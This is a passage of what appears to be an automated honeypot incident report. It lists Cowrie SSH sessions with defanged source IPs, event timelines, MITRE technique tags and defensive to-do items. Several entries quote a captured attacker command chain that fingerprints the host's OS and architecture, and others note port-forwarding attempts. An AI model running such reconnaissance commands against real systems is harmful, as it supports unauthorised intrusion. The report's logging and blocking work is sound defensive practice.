| **Last Seen** | 2026-07-26 06:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:44:01` | `cowrie.session.connect` |
| `2026-07-26 06:44:03` | `cowrie.client.version` |
| `2026-07-26 06:44:03` | `cowrie.client.kex` |
| `2026-07-26 06:44:05` | `cowrie.login.success` |
| `2026-07-26 06:44:06` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.86.168[.]224` to AbuseIPDB if not already reported
- [ ] Block `222.86.168[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8257ae98ba90

| Field | Detail |
|---|---|
| **Source IP** | `175.43.184[.]223` |
| **First Seen** | 2026-07-26 06:44 |
| **Last Seen** | 2026-07-26 06:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:44:11` | `cowrie.session.connect` |
| `2026-07-26 06:44:12` | `cowrie.client.version` |
| `2026-07-26 06:44:12` | `cowrie.client.kex` |
| `2026-07-26 06:44:14` | `cowrie.login.success` |
| `2026-07-26 06:44:15` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.43.184[.]223` to AbuseIPDB if not already reported
- [ ] Block `175.43.184[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-138538b66c77

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:45 |
| **Last Seen** | 2026-07-26 06:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:45:39` | `cowrie.session.connect` |
| `2026-07-26 06:45:40` | `cowrie.client.version` |
| `2026-07-26 06:45:40` | `cowrie.client.kex` |
| `2026-07-26 06:45:42` | `cowrie.login.success` |
| `2026-07-26 06:45:44` | `cowrie.session.params` |
| `2026-07-26 06:45:44` | `cowrie.command.input` |
| `2026-07-26 06:45:44` | `cowrie.command.input` |
| `2026-07-26 06:45:44` | `cowrie.command.input` |
| `2026-07-26 06:45:44` | `cowrie.command.input` |
| `2026-07-26 06:45:44` | `cowrie.command.input` |
| `2026-07-26 06:45:44` | `cowrie.command.success` |
| `2026-07-26 06:45:44` | `cowrie.command.input` |
| `2026-07-26 06:45:44` | `cowrie.command.input` |
| `2026-07-26 06:45:44` | `cowrie.command.input` |
| `2026-07-26 06:45:44` | `cowrie.command.input` |
| `2026-07-26 06:45:45` | `cowrie.log.closed` |
| `2026-07-26 06:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71783b7112f1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:47 |
| **Last Seen** | 2026-07-26 06:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:47:35` | `cowrie.session.connect` |
| `2026-07-26 06:47:35` | `cowrie.client.version` |
| `2026-07-26 06:47:35` | `cowrie.client.kex` |
| `2026-07-26 06:47:37` | `cowrie.login.success` |
| `2026-07-26 06:47:39` | `cowrie.session.params` |
| `2026-07-26 06:47:39` | `cowrie.command.input` |
| `2026-07-26 06:47:39` | `cowrie.command.input` |
| `2026-07-26 06:47:39` | `cowrie.command.input` |
| `2026-07-26 06:47:39` | `cowrie.command.input` |
| `2026-07-26 06:47:39` | `cowrie.command.input` |
| `2026-07-26 06:47:39` | `cowrie.command.success` |
| `2026-07-26 06:47:39` | `cowrie.command.input` |
| `2026-07-26 06:47:39` | `cowrie.command.input` |
| `2026-07-26 06:47:39` | `cowrie.command.input` |
| `2026-07-26 06:47:39` | `cowrie.command.input` |
| `2026-07-26 06:47:39` | `cowrie.log.closed` |
| `2026-07-26 06:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2a77d3fe644

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:51 |
| **Last Seen** | 2026-07-26 06:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:51:21` | `cowrie.session.connect` |
| `2026-07-26 06:51:21` | `cowrie.client.version` |
| `2026-07-26 06:51:21` | `cowrie.client.kex` |
| `2026-07-26 06:51:23` | `cowrie.login.success` |
| `2026-07-26 06:51:25` | `cowrie.session.params` |
| `2026-07-26 06:51:25` | `cowrie.command.input` |
| `2026-07-26 06:51:25` | `cowrie.command.input` |
| `2026-07-26 06:51:25` | `cowrie.command.input` |
| `2026-07-26 06:51:25` | `cowrie.command.input` |
| `2026-07-26 06:51:25` | `cowrie.command.input` |
| `2026-07-26 06:51:25` | `cowrie.command.success` |
| `2026-07-26 06:51:25` | `cowrie.command.input` |
| `2026-07-26 06:51:25` | `cowrie.command.input` |
| `2026-07-26 06:51:25` | `cowrie.command.input` |
| `2026-07-26 06:51:25` | `cowrie.command.input` |
| `2026-07-26 06:51:25` | `cowrie.log.closed` |
| `2026-07-26 06:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d855c919354

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:53 |
| **Last Seen** | 2026-07-26 06:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:53:15` | `cowrie.session.connect` |
| `2026-07-26 06:53:15` | `cowrie.client.version` |
| `2026-07-26 06:53:15` | `cowrie.client.kex` |
| `2026-07-26 06:53:17` | `cowrie.login.success` |
| `2026-07-26 06:53:18` | `cowrie.session.params` |
| `2026-07-26 06:53:18` | `cowrie.command.input` |
| `2026-07-26 06:53:18` | `cowrie.command.input` |
| `2026-07-26 06:53:18` | `cowrie.command.input` |
| `2026-07-26 06:53:18` | `cowrie.command.input` |
| `2026-07-26 06:53:18` | `cowrie.command.input` |
| `2026-07-26 06:53:18` | `cowrie.command.success` |
| `2026-07-26 06:53:18` | `cowrie.command.input` |
| `2026-07-26 06:53:18` | `cowrie.command.input` |
| `2026-07-26 06:53:18` | `cowrie.command.input` |
| `2026-07-26 06:53:18` | `cowrie.command.input` |
| `2026-07-26 06:53:19` | `cowrie.log.closed` |
| `2026-07-26 06:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de0340222034

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:55 |
| **Last Seen** | 2026-07-26 06:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:55:10` | `cowrie.session.connect` |
| `2026-07-26 06:55:10` | `cowrie.client.version` |
| `2026-07-26 06:55:10` | `cowrie.client.kex` |
| `2026-07-26 06:55:12` | `cowrie.login.success` |
| `2026-07-26 06:55:14` | `cowrie.session.params` |
| `2026-07-26 06:55:14` | `cowrie.command.input` |
| `2026-07-26 06:55:14` | `cowrie.command.input` |
| `2026-07-26 06:55:14` | `cowrie.command.input` |
| `2026-07-26 06:55:14` | `cowrie.command.input` |
| `2026-07-26 06:55:14` | `cowrie.command.input` |
| `2026-07-26 06:55:14` | `cowrie.command.success` |
| `2026-07-26 06:55:14` | `cowrie.command.input` |
| `2026-07-26 06:55:14` | `cowrie.command.input` |
| `2026-07-26 06:55:14` | `cowrie.command.input` |
| `2026-07-26 06:55:14` | `cowrie.command.input` |
| `2026-07-26 06:55:14` | `cowrie.log.closed` |
| `2026-07-26 06:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f54f820e193

| Field | Detail |
|---|---|
| **Source IP** | `75.80.65[.]214` |
| **First Seen** | 2026-07-26 06:56 |
| **Last Seen** | 2026-07-26 06:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:56:25` | `cowrie.session.connect` |
| `2026-07-26 06:56:26` | `cowrie.client.version` |
| `2026-07-26 06:56:26` | `cowrie.client.kex` |
| `2026-07-26 06:56:27` | `cowrie.login.success` |
| `2026-07-26 06:56:28` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.80.65[.]214` to AbuseIPDB if not already reported
- [ ] Block `75.80.65[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51f200a6ba48

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:57 |
| **Last Seen** | 2026-07-26 06:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:57:04` | `cowrie.session.connect` |
| `2026-07-26 06:57:04` | `cowrie.client.version` |
| `2026-07-26 06:57:04` | `cowrie.client.kex` |
| `2026-07-26 06:57:06` | `cowrie.login.success` |
| `2026-07-26 06:57:08` | `cowrie.session.params` |
| `2026-07-26 06:57:08` | `cowrie.command.input` |
| `2026-07-26 06:57:08` | `cowrie.command.input` |
| `2026-07-26 06:57:08` | `cowrie.command.input` |
| `2026-07-26 06:57:08` | `cowrie.command.input` |
| `2026-07-26 06:57:08` | `cowrie.command.input` |
| `2026-07-26 06:57:08` | `cowrie.command.success` |
| `2026-07-26 06:57:08` | `cowrie.command.input` |
| `2026-07-26 06:57:08` | `cowrie.command.input` |
| `2026-07-26 06:57:08` | `cowrie.command.input` |
| `2026-07-26 06:57:08` | `cowrie.command.input` |
| `2026-07-26 06:57:08` | `cowrie.log.closed` |
| `2026-07-26 06:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-169c482174e8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:59 |
| **Last Seen** | 2026-07-26 06:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:59:01` | `cowrie.session.connect` |
| `2026-07-26 06:59:01` | `cowrie.client.version` |
| `2026-07-26 06:59:01` | `cowrie.client.kex` |
| `2026-07-26 06:59:03` | `cowrie.login.success` |
| `2026-07-26 06:59:05` | `cowrie.session.params` |
| `2026-07-26 06:59:05` | `cowrie.command.input` |
| `2026-07-26 06:59:05` | `cowrie.command.input` |
| `2026-07-26 06:59:05` | `cowrie.command.input` |
| `2026-07-26 06:59:05` | `cowrie.command.input` |
| `2026-07-26 06:59:05` | `cowrie.command.input` |
| `2026-07-26 06:59:05` | `cowrie.command.success` |
| `2026-07-26 06:59:05` | `cowrie.command.input` |
| `2026-07-26 06:59:05` | `cowrie.command.input` |
| `2026-07-26 06:59:05` | `cowrie.command.input` |
| `2026-07-26 06:59:05` | `cowrie.command.input` |
| `2026-07-26 06:59:05` | `cowrie.log.closed` |
| `2026-07-26 06:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31cc7b73abee

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]229` |
| **First Seen** | 2026-07-26 06:59 |
| **Last Seen** | 2026-07-26 06:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:59:47` | `cowrie.session.connect` |
| `2026-07-26 06:59:47` | `cowrie.client.version` |
| `2026-07-26 06:59:47` | `cowrie.client.kex` |
| `2026-07-26 06:59:49` | `cowrie.login.success` |
| `2026-07-26 06:59:50` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]229` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86d8adb4eaed

| Field | Detail |
|---|---|
| **Source IP** | `49.206.194[.]29` |
| **First Seen** | 2026-07-26 06:59 |
| **Last Seen** | 2026-07-26 07:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:59:55` | `cowrie.session.connect` |
| `2026-07-26 06:59:56` | `cowrie.client.version` |
| `2026-07-26 06:59:56` | `cowrie.client.kex` |
| `2026-07-26 06:59:58` | `cowrie.login.success` |
| `2026-07-26 06:59:59` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.194[.]29` to AbuseIPDB if not already reported
- [ ] Block `49.206.194[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda5fc7f953d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:00 |
| **Last Seen** | 2026-07-26 07:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:00:58` | `cowrie.session.connect` |
| `2026-07-26 07:00:58` | `cowrie.client.version` |
| `2026-07-26 07:00:58` | `cowrie.client.kex` |
| `2026-07-26 07:01:00` | `cowrie.login.success` |
| `2026-07-26 07:01:02` | `cowrie.session.params` |
| `2026-07-26 07:01:02` | `cowrie.command.input` |
| `2026-07-26 07:01:02` | `cowrie.command.input` |
| `2026-07-26 07:01:02` | `cowrie.command.input` |
| `2026-07-26 07:01:02` | `cowrie.command.input` |
| `2026-07-26 07:01:02` | `cowrie.command.input` |
| `2026-07-26 07:01:02` | `cowrie.command.success` |
| `2026-07-26 07:01:02` | `cowrie.command.input` |
| `2026-07-26 07:01:02` | `cowrie.command.input` |
| `2026-07-26 07:01:02` | `cowrie.command.input` |
| `2026-07-26 07:01:02` | `cowrie.command.input` |
| `2026-07-26 07:01:02` | `cowrie.log.closed` |
| `2026-07-26 07:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43abaf050e0d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 07:02 |
| **Last Seen** | 2026-07-26 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:02:49` | `cowrie.session.connect` |
| `2026-07-26 07:02:49` | `cowrie.client.version` |
| `2026-07-26 07:02:49` | `cowrie.client.kex` |
| `2026-07-26 07:02:49` | `cowrie.login.success` |
| `2026-07-26 07:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6260a8033ff9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 07:02 |
| **Last Seen** | 2026-07-26 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:02:49` | `cowrie.session.connect` |
| `2026-07-26 07:02:49` | `cowrie.client.version` |
| `2026-07-26 07:02:49` | `cowrie.client.kex` |
| `2026-07-26 07:02:49` | `cowrie.login.success` |
| `2026-07-26 07:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95c6234ece90

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 07:02 |
| **Last Seen** | 2026-07-26 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:02:50` | `cowrie.session.connect` |
| `2026-07-26 07:02:50` | `cowrie.client.version` |
| `2026-07-26 07:02:50` | `cowrie.client.kex` |
| `2026-07-26 07:02:50` | `cowrie.login.success` |
| `2026-07-26 07:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e6ec2aab1a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 07:02 |
| **Last Seen** | 2026-07-26 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:02:50` | `cowrie.session.connect` |
| `2026-07-26 07:02:50` | `cowrie.client.version` |
| `2026-07-26 07:02:50` | `cowrie.client.kex` |
| `2026-07-26 07:02:51` | `cowrie.login.success` |
| `2026-07-26 07:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1007ecbe465f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:02 |
| **Last Seen** | 2026-07-26 07:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
